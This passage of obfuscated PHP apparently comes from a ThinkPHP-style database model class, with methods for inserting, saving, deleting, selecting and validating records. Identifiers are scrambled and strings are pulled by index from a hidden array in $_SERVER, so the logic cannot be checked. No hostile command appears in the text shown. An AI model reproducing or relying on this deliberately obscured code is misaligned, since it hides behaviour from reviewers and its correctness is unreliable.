array($‘ÅØáé¦[343], $‘ÅØáé¦[344], $‘ÅØáé¦[345], $‘ÅØáé¦[346], $‘ÅØáé¦[347]), !0)) { $¼ÂİåÒ‚ = isset($”ÌêšøÏ[0]) ? $”ÌêšøÏ[0] : $‘ÅØáé¦[222]; $¼ÂİåÒ‚ = $this->db->parseKey($¼ÂİåÒ‚); return $this->getField(strtoupper($ŞÏÖ¥Å) . $‘ÅØáé¦[348] . $¼ÂİåÒ‚ . $‘ÅØáé¦[349] . $ŞÏÖ¥Å, $‘ÅØáé¦[343]); } elseif (strtolower(substr($ŞÏÖ¥Å, 0, 5)) == $‘ÅØáé¦[350]) { $¼ÂİåÒ‚ = think_parse_name(substr($ŞÏÖ¥Å, 5)); $„•¨Å‡ğ[$¼ÂİåÒ‚] = $”ÌêšøÏ[0]; return $this->where($„•¨Å‡ğ)->find(); } elseif (strtolower(substr($ŞÏÖ¥Å, 0, 10)) == $‘ÅØáé¦[351]) { $ª—„´ŸÔ = think_parse_name(substr($ŞÏÖ¥Å, 10)); $„•¨Å‡ğ[$ª—„´ŸÔ] = $”ÌêšøÏ[0]; return $this->where($„•¨Å‡ğ)->getField($”ÌêšøÏ[1]); } elseif (isset($this->_scope[$ŞÏÖ¥Å])) { return $this->scope($ŞÏÖ¥Å, $”ÌêšøÏ[0]); } elseif (method_exists($this, $ŞÏÖ¥Å)) { array_unshift($”ÌêšøÏ, $ŞÏÖ¥Å); return call_user_func_array(array($this, $‘ÅØáé¦[352]), $”ÌêšøÏ); } else { return call_user_func_array(array(parent, $ŞÏÖ¥Å), $”ÌêšøÏ); } } protected function call() { $ù¾¢ßÎ³ =& $_SERVER[´È¥ö†ö]; $í¶¯øæÖ = func_get_args(); $ÎÒ¸÷˜ = array_shift($í¶¯øæÖ); $‚Ã¡û¼ = $ÎÒ¸÷˜; if (is_array($ÎÒ¸÷˜)) { $‚Ã¡û¼ = $ÎÒ¸÷˜[1]; $ÎÒ¸÷˜ = $ÎÒ¸÷˜[0]; } $Ì¶µŞ™¥ = count($í¶¯øæÖ) - 1; if (isset($í¶¯øæÖ[$Ì¶µŞ™¥]) && $í¶¯øæÖ[$Ì¶µŞ™¥] === $ÎÒ¸÷˜) { think_exception(__CLASS__ . $ù¾¢ßÎ³[4] . $ÎÒ¸÷˜ . think_lang($ù¾¢ßÎ³[353])); return; } $í¶¯øæÖ[] = $ÎÒ¸÷˜; if (method_exists($this, $ù¾¢ßÎ³[354])) { $¶¥‰ô‚ = call_user_func_array(array($this, $ù¾¢ßÎ³[355]), array($‚Ã¡û¼, $í¶¯øæÖ)); if (!is_null($¶¥‰ô‚) && $¶¥‰ô‚ !== !1) { return $¶¥‰ô‚; } } $üÁõğ = call_user_func_array(array($this, $ÎÒ¸÷˜), $í¶¯øæÖ); if (method_exists($this, $ù¾¢ßÎ³[356])) { $¶¥‰ô‚ = call_user_func_array(array($this, $ù¾¢ßÎ³[357]), array($‚Ã¡û¼, $í¶¯øæÖ, $üÁõğ)); if ($¶¥‰ô‚) { return $¶¥‰ô‚; } } return $üÁõğ; } protected function _initialize() { } protected function _facade($ÏÑ¶šı°) { $ØĞâÍÓ =& $_SERVER[´È¥ö†ö]; if (!empty($this->fields)) { foreach ($ÏÑ¶šı° as $«ºÖºÙ => $·¸™Å™´) { if (is_array($this->fields) && !in_array($«ºÖºÙ, $this->fields, !0)) { unset($ÏÑ¶šı°[$«ºÖºÙ]); } elseif (is_scalar($·¸™Å™´)) { $this->_parseType($ÏÑ¶šı°, $«ºÖºÙ); } } } if (!empty($this->options[$ØĞâÍÓ[358]])) { $ÏÑ¶šı° = array_map($this->options[$ØĞâÍÓ[358]], $ÏÑ¶šı°); unset($this->options[$ØĞâÍÓ[358]]); } $this->_beforeWrite($ÏÑ¶šı°); return $ÏÑ¶šı°; } protected function _beforeWrite(&$’«çíªÔ) { } public function add($Ã”ıìüà = '', $ˆå¨ÌŒû = array(), $ê‡’×¾õ = false) { if (empty($Ã”ıìüà)) { if (!empty($this->data)) { $Ã”ıìüà = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[´È¥ö†ö][359]); return !1; } } $ˆå¨ÌŒû = $this->_parseOptions($ˆå¨ÌŒû); $Ã”ıìüà = $this->_facade($Ã”ıìüà); if (!1 === $this->_beforeInsert($Ã”ıìüà, $ˆå¨ÌŒû)) { return !1; } $ŒÍÂé¤¸ = $this->db->insert($Ã”ıìüà, $ˆå¨ÌŒû, $ê‡’×¾õ); if (!1 !== $ŒÍÂé¤¸) { $—İèŞ¡ = $this->getLastInsID(); if ($—İèŞ¡) { $Ã”ıìüà[$this->getPk()] = $—İèŞ¡; $this->_after_insert($Ã”ıìüà, $ˆå¨ÌŒû); return $—İèŞ¡; } $this->_after_insert($Ã”ıìüà, $ˆå¨ÌŒû); } return $ŒÍÂé¤¸; } protected function _beforeInsert(&$·±Ş×âÎ, $¸¾§ßÌì) { } protected function _after_insert($²…ë´íŠ, $ªğ¦«ŸÈ) { } public function addAll($ûîü˜ü, $£³æ¯¨½ = array(), $áÓùÙ = false) { $‘ƒÎòô =& $_SERVER[´È¥ö†ö]; if (empty($ûîü˜ü)) { $this->error = think_lang($‘ƒÎòô[359]); return !1; } $£³æ¯¨½ = $this->_parseOptions($£³æ¯¨½); foreach ($ûîü˜ü as $Á•øÜßï => $éÅ°‹Ç) { $ûîü˜ü[$Á•øÜßï] = $this->_facade($éÅ°‹Ç); } if (method_exists($this->db, $‘ƒÎòô[360])) { $¡İĞ˜¸Ü = $this->db->insertAll($ûîü˜ü, $£³æ¯¨½, $áÓùÙ); } else { $this->startTrans(); foreach ($ûîü˜ü as $Á•øÜßï => $éÅ°‹Ç) { $¡İĞ˜¸Ü = $this->db->insert($éÅ°‹Ç, $£³æ¯¨½, $áÓùÙ); } $this->commit(); } if (!1 !== $¡İĞ˜¸Ü) { $„—¨à§½ = $this->getLastInsID(); if ($„—¨à§½) { return $„—¨à§½; } } return $¡İĞ˜¸Ü; } public function selectAdd($í””ê»‰ = '', $‚Æ°ÚÁ” = '', $¨ïÎ•«š = array()) { $«ûº©¹’ =& $_SERVER[´È¥ö†ö]; $¨ïÎ•«š = $this->_parseOptions($¨ïÎ•«š); if (!1 === ($ò†¹Ùşõ = $this->db->selectInsert($í””ê»‰ ? $í””ê»‰ : $¨ïÎ•«š[$«ûº©¹’[361]], $‚Æ°ÚÁ” ? $‚Æ°ÚÁ” : $this->getTableName(), $¨ïÎ•«š))) { $this->error = think_lang($«ûº©¹’[362]); return !1; } else { return $ò†¹Ùşõ; } } public function save($Úâ½šù¨ = '', $ÆÌóæ¾Ç = array()) { $ ¦Õ Ñó =& $_SERVER[´È¥ö†ö]; if (empty($Úâ½šù¨)) { if (!empty($this->data)) { $Úâ½šù¨ = $this->data; $this->data = array(); } else { $this->error = think_lang($ ¦Õ Ñó[359]); return !1; } } $Úâ½šù¨ = $this->_facade($Úâ½šù¨); $ÆÌóæ¾Ç = $this->_parseOptions($ÆÌóæ¾Ç); $½µİêÄ’ = $this->getPk(); if (!isset($ÆÌóæ¾Ç[$ ¦Õ Ñó[363]])) { if (isset($Úâ½šù¨[$½µİêÄ’])) { $ĞÄı¤«[$½µİêÄ’] = $Úâ½šù¨[$½µİêÄ’]; $ÆÌóæ¾Ç[$ ¦Õ Ñó[363]] = $ĞÄı¤«; unset($Úâ½šù¨[$½µİêÄ’]); } else { $this->error = think_lang($ ¦Õ Ñó[362]); return !1; } } if (is_array($ÆÌóæ¾Ç[$ ¦Õ Ñó[363]]) && isset($ÆÌóæ¾Ç[$ ¦Õ Ñó[363]][$½µİêÄ’])) { $ë²ê£« = $ÆÌóæ¾Ç[$ ¦Õ Ñó[363]][$½µİêÄ’]; } if (!1 === $this->_beforeUpdate($Úâ½šù¨, $ÆÌóæ¾Ç)) { return !1; } $í°ÙÀ = $this->db->update($Úâ½šù¨, $ÆÌóæ¾Ç); if (!1 !== $í°ÙÀ) { if (isset($ë²ê£«)) { $Úâ½šù¨[$½µİêÄ’] = $ë²ê£«; } $this->_afterUpdate($Úâ½šù¨, $ÆÌóæ¾Ç); } return $í°ÙÀ; } protected function _beforeUpdate(&$º¥£°€—, $ÉËàŒ§ò) { } protected function _afterUpdate($úÆÊÉ¡, $Ñ‡ÙìÖ) { } public function delete($ÃÅÃæ÷Ù = array()) { $ä¬¥®Èâ =& $_SERVER[´È¥ö†ö]; if (empty($ÃÅÃæ÷Ù) && empty($this->options[$ä¬¥®Èâ[363]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ÃÎ”²¯é = $this->getPk(); if (is_numeric($ÃÅÃæ÷Ù) || is_string($ÃÅÃæ÷Ù)) { if (strpos($ÃÅÃæ÷Ù, $ä¬¥®Èâ[50])) { $âìî ûÆ[$ÃÎ”²¯é] = array($ä¬¥®Èâ[364], $ÃÅÃæ÷Ù); } else { $âìî ûÆ[$ÃÎ”²¯é] = $ÃÅÃæ÷Ù; } $this->options[$ä¬¥®Èâ[363]] = $âìî ûÆ; } $ÃÅÃæ÷Ù = $this->_parseOptions(); if (is_array($ÃÅÃæ÷Ù[$ä¬¥®Èâ[363]]) && isset($ÃÅÃæ÷Ù[$ä¬¥®Èâ[363]][$ÃÎ”²¯é])) { $–ƒï‚ÍÏ = $ÃÅÃæ÷Ù[$ä¬¥®Èâ[363]][$ÃÎ”²¯é]; } $ŸÙã×¯† = $this->db->delete($ÃÅÃæ÷Ù); if (!1 !== $ŸÙã×¯†) { $‡ûùğñ = array(); if (isset($–ƒï‚ÍÏ)) { $‡ûùğñ[$ÃÎ”²¯é] = $–ƒï‚ÍÏ; } $this->_after_delete($‡ûùğñ, $ÃÅÃæ÷Ù); } return $ŸÙã×¯†; } protected function _after_delete($çÂÍ¿­, $ƒŸ†‰áŞ) { } public function select($Ãò¶®ˆò = array()) { $Ñİ¹ûê» =& $_SERVER[´È¥ö†ö]; if (is_string($Ãò¶®ˆò) || is_numeric($Ãò¶®ˆò)) { $¾–÷±’Í = $this->getPk(); if (strpos($Ãò¶®ˆò, $Ñİ¹ûê»[50])) { $ïƒƒ±˜[$¾–÷±’Í] = array($Ñİ¹ûê»[364], $Ãò¶®ˆò); } else { $ïƒƒ±˜[$¾–÷±’Í] = $Ãò¶®ˆò; } $this->options[$Ñİ¹ûê»[363]] = $ïƒƒ±˜; } elseif (!1 === $Ãò¶®ˆò) { $Ãò¶®ˆò = $this->_parseOptions(); return $Ñİ¹ûê»[365] . $this->db->buildSelectSql($Ãò¶®ˆò) . $Ñİ¹ûê»[366]; } $Ãò¶®ˆò = $this->_parseOptions(); $’ã¬ºÓ÷ = $this->db->select($Ãò¶®ˆò); if (!1 === $’ã¬ºÓ÷) { return !1; } if (empty($’ã¬ºÓ÷)) { return null; } $this->_afterSelect($’ã¬ºÓ÷, $Ãò¶®ˆò); return $’ã¬ºÓ÷; } protected function _afterSelect(&$ÅİÀ…â‘, $¨›éŸı ) { } public function buildSql($åÓÏ¶Ì = array()) { $¥éÙƒôÒ =& $_SERVER[´È¥ö†ö]; $åÓÏ¶Ì = $this->_parseOptions($åÓÏ¶Ì); return $¥éÙƒôÒ[365] . $this->db->buildSelectSql($åÓÏ¶Ì) . $¥éÙƒôÒ[366]; } public function optionsValue($ğ¢à¹™ = null) { if (is_null($ğ¢à¹™)) { return $this->options; } elseif (is_array($ğ¢à¹™)) { $this->options = array_merge($this->options, $ğ¢à¹™); } } protected function _parseOptions($‘§½¿± = array()) { $ëÂŠŠÄÍ =& $_SERVER[´È¥ö†ö]; if (is_array($‘§½¿±)) { $‘§½¿± = array_merge($this->options, $‘§½¿±); } $this->options = array(); if (!isset($‘§½¿±[$ëÂŠŠÄÍ[367]])) { $‘§½¿±[$ëÂŠŠÄÍ[367]] = $this->getTableName(); $×®®ÎèÕ = $this->fields; } else { $×®®ÎèÕ = $this->getDbFields(); } if (!empty($‘§½¿±[$ëÂŠŠÄÍ[368]])) { $‘§½¿±[$ëÂŠŠÄÍ[367]] .= $ëÂŠŠÄÍ[53] . $‘§½¿±[$ëÂŠŠÄÍ[368]]; } $‘§½¿±[$ëÂŠŠÄÍ[369]] = $this->name; if (isset($‘§½¿±[$ëÂŠŠÄÍ[363]]) && is_array($‘§½¿±[$ëÂŠŠÄÍ[363]]) && !empty($×®®ÎèÕ) && !isset($‘§½¿±[$ëÂŠŠÄÍ[370]]) && !isset($‘§½¿±[$ëÂŠŠÄÍ[367]])) { foreach ($‘§½¿±[$ëÂŠŠÄÍ[363]] as $¦¸÷éÔ => $Ø°óşæĞ) { $¦¸÷éÔ = trim($¦¸÷éÔ); if (in_array($¦¸÷éÔ, $×®®ÎèÕ, !0)) { if (is_scalar($Ø°óşæĞ)) { $this->_parseType($‘§½¿±[$ëÂŠŠÄÍ[363]], $¦¸÷éÔ); } } elseif (!is_numeric($¦¸÷éÔ) && $ëÂŠŠÄÍ[11] != substr($¦¸÷éÔ, 0, 1) && !1 === strpos($¦¸÷éÔ, $ëÂŠŠÄÍ[10]) && !1 === strpos($¦¸÷éÔ, $ëÂŠŠÄÍ[348]) && !1 === strpos($¦¸÷éÔ, $ëÂŠŠÄÍ[214]) && !1 === strpos($¦¸÷éÔ, $ëÂŠŠÄÍ[286])) { unset($‘§½¿±[$ëÂŠŠÄÍ[363]][$¦¸÷éÔ]); } } } $this->_options_filter($‘§½¿±); return $‘§½¿±; } protected function _options_filter(&$•¨¼ôÔ) { } protected function _parseType(&$Û§ÅØÇª, $Ÿ¨ìµêê) { $áçÇ»Œ =& $_SERVER[´È¥ö†ö]; if (empty($this->options[$áçÇ»Œ[371]][$áçÇ»Œ[4] . $Ÿ¨ìµêê])) { $‰‰³¡ø = strtolower($this->fields[$áçÇ»Œ[340]][$Ÿ¨ìµêê]); if (!1 !== strpos($‰‰³¡ø, $áçÇ»Œ[372])) { } elseif (!1 === strpos($‰‰³¡ø, $áçÇ»Œ[373]) && !1 !== strpos($‰‰³¡ø, $áçÇ»Œ[374])) { $Û§ÅØÇª[$Ÿ¨ìµêê] = intval($Û§ÅØÇª[$Ÿ¨ìµêê]); } elseif (!1 !== strpos($‰‰³¡ø, $áçÇ»Œ[375]) || !1 !== strpos($‰‰³¡ø, $áçÇ»Œ[376])) { $Û§ÅØÇª[$Ÿ¨ìµêê] = floatval($Û§ÅØÇª[$Ÿ¨ìµêê]); } elseif (!1 !== strpos($‰‰³¡ø, $áçÇ»Œ[377])) { $Û§ÅØÇª[$Ÿ¨ìµêê] = (bool) $Û§ÅØÇª[$Ÿ¨ìµêê]; } } } public function find($ğŞ©ëİğ = array()) { $ÏÅËâ¬Ù =& $_SERVER[´È¥ö†ö]; if (is_numeric($ğŞ©ëİğ) || is_string($ğŞ©ëİğ)) { $øø‚ûğÀ[$this->getPk()] = intval($ğŞ©ëİğ); $this->options[$ÏÅËâ¬Ù[363]] = $øø‚ûğÀ; } $this->options[$ÏÅËâ¬Ù[378]] = 1; $ğŞ©ëİğ = $this->_parseOptions(); $ÊÏ…Ô™ë = $this->db->select($ğŞ©ëİğ); if (!1 === $ÊÏ…Ô™ë) { return !1; } if (empty($ÊÏ…Ô™ë)) { return null; } $this->data = $ÊÏ…Ô™ë[0]; $this->_afterFind($this->data, $ğŞ©ëİğ); if (!empty($this->options[$ÏÅËâ¬Ù[379]])) { return $this->returnResult($this->data, $this->options[$ÏÅËâ¬Ù[379]]); } return $this->data; } protected function _afterFind(&$åÁõï¹¾, $ŸÈÆ×¼È) { } protected function returnResult($áûç¬Ñ, $¸á¦š¡‡ = '') { $¹•Ã³¢Ì =& $_SERVER[´È¥ö†ö]; if ($¸á¦š¡‡) { if (is_callable($¸á¦š¡‡)) { return call_user_func($¸á¦š¡‡, $áûç¬Ñ); } switch (strtolower($¸á¦š¡‡)) { case $¹•Ã³¢Ì[380]: return json_encode($áûç¬Ñ); case $¹•Ã³¢Ì[381]: return xml_encode($áûç¬Ñ); } } return $áûç¬Ñ; } public function parseFieldsMap($ªóºÔ°ğ, $¤ÎïŞê = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ññ‘Ğß™ => $Ñš„ Êá) { if ($¤ÎïŞê == 1) { if (isset($ªóºÔ°ğ[$Ñš„ Êá])) { $ªóºÔ°ğ[$ññ‘Ğß™] = $ªóºÔ°ğ[$Ñš„ Êá]; unset($ªóºÔ°ğ[$Ñš„ Êá]); } } else { if (isset($ªóºÔ°ğ[$ññ‘Ğß™])) { $ªóºÔ°ğ[$Ñš„ Êá] = $ªóºÔ°ğ[$ññ‘Ğß™]; unset($ªóºÔ°ğ[$ññ‘Ğß™]); } } } } return $ªóºÔ°ğ; } public function setField($Ğ‹Şë÷, $èù”ú»È = '') { if (is_array($Ğ‹Şë÷)) { $ÄÜ³€ñº = $Ğ‹Şë÷; } else { $ÄÜ³€ñº[$Ğ‹Şë÷] = $èù”ú»È; } return $this->save($ÄÜ³€ñº); } public function setAdd($‰âøÜúê, $õ‘è»¶ = 1) { $µ…Õğ°˜ =& $_SERVER[´È¥ö†ö]; $Ôì´œŒÉ = $‰âøÜúê . $µ…Õğ°˜[382] . $õ‘è»¶; if ($õ‘è»¶ < 0) { $Ôì´œŒÉ = $‰âøÜúê . $õ‘è»¶; } return $this->setField($‰âøÜúê, array($µ…Õğ°˜[383], $Ôì´œŒÉ)); } public function getField($ôª™ÛÍß, $ıàÅãŸ = null) { $ğé…˜Ñ =& $_SERVER[´È¥ö†ö]; $úå›³æê[$ğé…˜Ñ[361]] = $ôª™ÛÍß; $úå›³æê = $this->_parseOptions($úå›³æê); $ôª™ÛÍß = trim($ôª™ÛÍß); if (strpos($ôª™ÛÍß, $ğé…˜Ñ[50])) { if (!isset($úå›³æê[$ğé…˜Ñ[378]])) { $úå›³æê[$ğé…˜Ñ[378]] = is_numeric($ıàÅãŸ) ? $ıàÅãŸ : $ğé…˜Ñ[12]; } $‡Æ’ŒÑ† = $this->db->select($úå›³æê); if (!empty($‡Æ’ŒÑ†)) { $ø«Û¢¿ê = explode($ğé…˜Ñ[50], $ôª™ÛÍß); $ôª™ÛÍß = array_keys($‡Æ’ŒÑ†[0]); $Ÿ™×şü = array_shift($ôª™ÛÍß); $“”«’§ö = array_shift($ôª™ÛÍß); $ğÁ„¹· = array(); $çèù”¬ = count($ø«Û¢¿ê); foreach ($‡Æ’ŒÑ† as $ÉùˆÇÂÃ) { $‹‹´Ì©ô = $ÉùˆÇÂÃ[$Ÿ™×şü]; if (2 == $çèù”¬) { $ğÁ„¹·[$‹‹´Ì©ô] = $ÉùˆÇÂÃ[$“”«’§ö]; } else { $ğÁ„¹·[$‹‹´Ì©ô] = is_string($ıàÅãŸ) ? implode($ıàÅãŸ, $ÉùˆÇÂÃ) : $ÉùˆÇÂÃ; } } return $ğÁ„¹·; } } else { if (!0 !== $ıàÅãŸ) { $úå›³æê[$ğé…˜Ñ[378]] = is_numeric($ıàÅãŸ) ? $ıàÅãŸ : 1; } if ($ıàÅãŸ === $ğé…˜Ñ[343]) { unset($úå›³æê[$ğé…˜Ñ[378]]); } $ÉùˆÇÂÃ = $this->db->select($úå›³æê); if (!empty($ÉùˆÇÂÃ)) { if ($ıàÅãŸ === $ğé…˜Ñ[343]) { return reset($ÉùˆÇÂÃ[0]); } if (!0 !== $ıàÅãŸ && 1 == $úå›³æê[$ğé…˜Ñ[378]]) { return reset($ÉùˆÇÂÃ[0]); } foreach ($ÉùˆÇÂÃ as $öƒì©Ö©) { $éãò€ö¬[] = $öƒì©Ö©[$ôª™ÛÍß]; } return $éãò€ö¬; } } return null; } public function create($¬ä™Ïõ• = '', $„ö‡üÚ = '') { $Ş‹‡Ô´Î =& $_SERVER[´È¥ö†ö]; if (empty($¬ä™Ïõ•)) { $¬ä™Ïõ• = $_POST; } elseif (is_object($¬ä™Ïõ•)) { $¬ä™Ïõ• = get_object_vars($¬ä™Ïõ•); } if (empty($¬ä™Ïõ•) || !is_array($¬ä™Ïõ•)) { $this->error = think_lang($Ş‹‡Ô´Î[359]); return !1; } $¬ä™Ïõ• = $this->parseFieldsMap($¬ä™Ïõ•, 0); $„ö‡üÚ = $„ö‡üÚ ? $„ö‡üÚ : (!empty($¬ä™Ïõ•[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Ş‹‡Ô´Î[361]])) { $×¾ª×Î³ = $this->options[$Ş‹‡Ô´Î[361]]; unset($this->options[$Ş‹‡Ô´Î[361]]); } elseif ($„ö‡üÚ == THINK_MODEL_INSERT && isset($this->insertFields)) { $×¾ª×Î³ = $this->insertFields; } elseif ($„ö‡üÚ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $×¾ª×Î³ = $this->updateFields; } if (isset($×¾ª×Î³)) { if (is_string($×¾ª×Î³)) { $×¾ª×Î³ = explode($Ş‹‡Ô´Î[50], $×¾ª×Î³); } if (think_config($Ş‹‡Ô´Î[384])) { $×¾ª×Î³[] = think_config($Ş‹‡Ô´Î[385]); } foreach ($¬ä™Ïõ• as $¯ç†ºÈŸ => $–ı‘ï) { if (!in_array($¯ç†ºÈŸ, $×¾ª×Î³)) { unset($¬ä™Ïõ•[$¯ç†ºÈŸ]); } } } if (!$this->autoValidation($¬ä™Ïõ•, $„ö‡üÚ)) { return !1; } if (!$this->autoCheckToken($¬ä™Ïõ•)) { $this->error = think_lang($Ş‹‡Ô´Î[386]); return !1; } if ($this->autoCheckFields) { $×¾ª×Î³ = $this->getDbFields(); foreach ($¬ä™Ïõ• as $¯ç†ºÈŸ => $–ı‘ï) { if (!in_array($¯ç†ºÈŸ, $×¾ª×Î³)) { unset($¬ä™Ïõ•[$¯ç†ºÈŸ]); } elseif (MAGIC_QUOTES_GPC && is_string($–ı‘ï)) { $¬ä™Ïõ•[$¯ç†ºÈŸ] = stripslashes($–ı‘ï); } } } $this->autoOperation($¬ä™Ïõ•, $„ö‡üÚ); $this->data = $¬ä™Ïõ•; return $¬ä™Ïõ•; } public function autoCheckToken($°úóäÊ¬) { $Şøµâœ =& $_SERVER[´È¥ö†ö]; if (isset($this->options[$Şøµâœ[387]]) && !$this->options[$Şøµâœ[387]]) { return !0; } if (think_config($Şøµâœ[384])) { $Şı©»‘Ğ = think_config($Şøµâœ[385]); if (!isset($°úóäÊ¬[$Şı©»‘Ğ]) || Session::get($Şı©»‘Ğ)) { return !1; } list($ÇÓÜê¯í, $ÇÛù ×) = explode($Şøµâœ[11], $°úóäÊ¬[$Şı©»‘Ğ]); if ($ÇÛù × && Session::get($Şı©»‘Ğ . $Şøµâœ[10] . $ÇÓÜê¯í) === $ÇÛù ×) { Session::remove($Şı©»‘Ğ . $Şøµâœ[10] . $ÇÓÜê¯í); return !0; } if (think_config($Şøµâœ[388])) { Session::remove($Şı©»‘Ğ . $Şøµâœ[10] . $ÇÓÜê¯í); } return !1; } return !0; } public function regex($±ğËªÂ, $ İÓëµ¢) { $ßÅê†¢ğ =& $_SERVER[´È¥ö†ö]; $Ö÷˜±Ö = array($ßÅê†¢ğ[389] => $ßÅê†¢ğ[390], $ßÅê†¢ğ[391] => $ßÅê†¢ğ[392], $ßÅê†¢ğ[393] => $ßÅê†¢ğ[394], $ßÅê†¢ğ[395] => $ßÅê†¢ğ[396], $ßÅê†¢ğ[397] => $ßÅê†¢ğ[398], $ßÅê†¢ğ[399] => $ßÅê†¢ğ[400], $ßÅê†¢ğ[401] => $ßÅê†¢ğ[402], $ßÅê†¢ğ[376] => $ßÅê†¢ğ[403], $ßÅê†¢ğ[404] => $ßÅê†¢ğ[405]); if (isset($Ö÷˜±Ö[strtolower($ İÓëµ¢)])) { $ İÓëµ¢ = $Ö÷˜±Ö[strtolower($ İÓëµ¢)]; } return preg_match($ İÓëµ¢, $±ğËªÂ) === 1; } private function autoOperation(&$£ù›²‰´, $ÔÚ˜—Ü) { $õûº¢Ò =& $_SERVER[´È¥ö†ö]; if (!empty($this->options[$õûº¢Ò[406]])) { $›Ê¨¿Í± = $this->options[$õûº¢Ò[406]]; unset($this->options[$õûº¢Ò[406]]); } elseif (!empty($this->_auto)) { $›Ê¨¿Í± = $this->_auto; } if (isset($›Ê¨¿Í±)) { foreach ($›Ê¨¿Í± as $ÜË»ÆÉŞ) { if (empty($ÜË»ÆÉŞ[2])) { $ÜË»ÆÉŞ[2] = THINK_MODEL_INSERT; } if ($ÔÚ˜—Ü == $ÜË»ÆÉŞ[2] || $ÜË»ÆÉŞ[2] == THINK_MODEL_BOTH) { switch (trim($ÜË»ÆÉŞ[3])) { case $õûº¢Ò[407]: case $õûº¢Ò[408]: $¹ø·ú‚¡ = isset($ÜË»ÆÉŞ[4]) ? (array) $ÜË»ÆÉŞ[4] : array(); if (isset($£ù›²‰´[$ÜË»ÆÉŞ[0]])) { array_unshift($¹ø·ú‚¡, $£ù›²‰´[$ÜË»ÆÉŞ[0]]); } if ($õûº¢Ò[407] == $ÜË»ÆÉŞ[3]) { $£ù›²‰´[$ÜË»ÆÉŞ[0]] = call_user_func_array($ÜË»ÆÉŞ[1], $¹ø·ú‚¡); } else { $£ù›²‰´[$ÜË»ÆÉŞ[0]] = call_user_func_array(array(&$this, $ÜË»ÆÉŞ[1]), $¹ø·ú‚¡); } break; case $õûº¢Ò[361]: $£ù›²‰´[$ÜË»ÆÉŞ[0]] = $£ù›²‰´[$ÜË»ÆÉŞ[1]]; break; case $õûº¢Ò[409]: if ($õûº¢Ò[12] === $£ù›²‰´[$ÜË»ÆÉŞ[0]]) { unset($£ù›²‰´[$ÜË»ÆÉŞ[0]]); } break; case $õûº¢Ò[410]: default: $£ù›²‰´[$ÜË»ÆÉŞ[0]] = $ÜË»ÆÉŞ[1]; } if (!1 === $£ù›²‰´[$ÜË»ÆÉŞ[0]]) { unset($£ù›²‰´[$ÜË»ÆÉŞ[0]]); } } } } return $£ù›²‰´; } protected function autoValidation($²Ô‡Çùü, $Ÿ÷¢Íıƒ) { $±ªÁ˜Ğ =& $_SERVER[´È¥ö†ö]; if (!empty($this->options[$±ªÁ˜Ğ[411]])) { $œ¨‹èªº = $this->options[$±ªÁ˜Ğ[411]]; unset($this->options[$±ªÁ˜Ğ[411]]); } elseif (!empty($this->_validate)) { $œ¨‹èªº = $this->_validate; } if (isset($œ¨‹èªº)) { if ($this->patchValidate) { $this->error = array(); } foreach ($œ¨‹èªº as $½»ĞÓº‘ => $¾–óˆ–¶) { if (empty($¾–óˆ–¶[5]) || $¾–óˆ–¶[5] == THINK_MODEL_BOTH || $¾–óˆ–¶[5] == $Ÿ÷¢Íıƒ) { if (0 == strpos($¾–óˆ–¶[2], $±ªÁ˜Ğ[412]) && strpos($¾–óˆ–¶[2], $±ªÁ˜Ğ[413])) { $¾–óˆ–¶[2] = think_lang(substr($¾–óˆ–¶[2], 2, -1)); } $¾–óˆ–¶[3] = isset($¾–óˆ–¶[3]) ? $¾–óˆ–¶[3] : THINK_EXISTS_VALIDATE; $¾–óˆ–¶[4] = isset($¾–óˆ–¶[4]) ? $¾–óˆ–¶[4] : $±ªÁ˜Ğ[414]; switch ($¾–óˆ–¶[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($²Ô‡Çùü, $¾–óˆ–¶)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($±ªÁ˜Ğ[12] != trim($²Ô‡Çùü[$¾–óˆ–¶[0]])) { if (!1 === $this->_validationField($²Ô‡Çùü, $¾–óˆ–¶)) { return !1; } } break; default: if (isset($²Ô‡Çùü[$¾–óˆ–¶[0]])) { if (!1 === $this->_validationField($²Ô‡Çùü, $¾–óˆ–¶)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($°ş£Ô, $¼†…¡‘¥) { if (!1 === $this->_validationFieldItem($°ş£Ô, $¼†…¡‘¥)) { if ($this->patchValidate) { $this->error[$¼†…¡‘¥[0]] = $¼†…¡‘¥[2]; } else { $this->error = $¼†…¡‘¥[2]; return !1; } } return; } protected function _validationFieldItem($…´”Øóµ, $°ğ•ëÑÄ) { $¤õ—€™ =& $_SERVER[´È¥ö†ö]; switch (strtolower(trim($°ğ•ëÑÄ[4]))) { case $¤õ—€™[407]: case $¤õ—€™[408]: $ô£“˜áä = isset($°ğ•ëÑÄ[6]) ? (array) $°ğ•ëÑÄ[6] : array(); if (is_string($°ğ•ëÑÄ[0]) && strpos($°ğ•ëÑÄ[0], $¤õ—€™[50])) { $°ğ•ëÑÄ[0] = explode($¤õ—€™[50], $°ğ•ëÑÄ[0]); } if (is_array($°ğ•ëÑÄ[0])) { foreach ($°ğ•ëÑÄ[0] as $¼¹Äûî÷) { $†¿ï¹÷“[$¼¹Äûî÷] = $…´”Øóµ[$¼¹Äûî÷]; } array_unshift($ô£“˜áä, $†¿ï¹÷“); } else { array_unshift($ô£“˜áä, $…´”Øóµ[$°ğ•ëÑÄ[0]]); } if ($¤õ—€™[407] == $°ğ•ëÑÄ[4]) { return call_user_func_array($°ğ•ëÑÄ[1], $ô£“˜áä); } else { return call_user_func_array(array(&$this, $°ğ•ëÑÄ[1]), $ô£“˜áä); } case $¤õ—€™[415]: return $…´”Øóµ[$°ğ•ëÑÄ[0]] == $…´”Øóµ[$°ğ•ëÑÄ[1]]; case $¤õ—€™[416]: if (is_string($°ğ•ëÑÄ[0]) && strpos($°ğ•ëÑÄ[0], $¤õ—€™[50])) { $°ğ•ëÑÄ[0] = explode($¤õ—€™[50], $°ğ•ëÑÄ[0]); } $ùøğ‚Ÿú = array(); if (is_array($°ğ•ëÑÄ[0])) { foreach ($°ğ•ëÑÄ[0] as $¼¹Äûî÷) { $ùøğ‚Ÿú[$¼¹Äûî÷] = $…´”Øóµ[$¼¹Äûî÷]; } } else { $ùøğ‚Ÿú[$°ğ•ëÑÄ[0]] 